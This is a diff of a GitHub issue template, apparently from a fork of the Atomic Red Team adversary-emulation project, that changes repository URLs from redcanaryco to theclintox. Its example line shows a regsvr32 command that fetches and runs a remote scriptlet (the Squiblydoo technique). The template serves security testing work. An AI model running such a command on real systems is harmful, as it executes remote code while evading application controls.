@@ -3,7 +3,7 @@
 ## What did you do?
 
 ℹ Please replace this with what you did.
-e.g. Run `regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll`
+e.g. Run `regsvr32.exe /s /u /i:https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll`
 
 ## What did you expect to happen?
 
@@ -22,5 +22,5 @@ e.g. 💥
 * If relevant, which atomic test is this specific to?
 * If relevant, which [execution harness](2) are you attempting to use?
 
-[1]: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics "atomic tests"
-[2]: https://github.com/redcanaryco/atomic-red-team/tree/master/execution-frameworks "execution frameworks"
+[1]: https://github.com/theclintox/atomic-red-team/tree/master/atomics "atomic tests"
+[2]: https://github.com/theclintox/atomic-red-team/tree/master/execution-frameworks "execution frameworks"
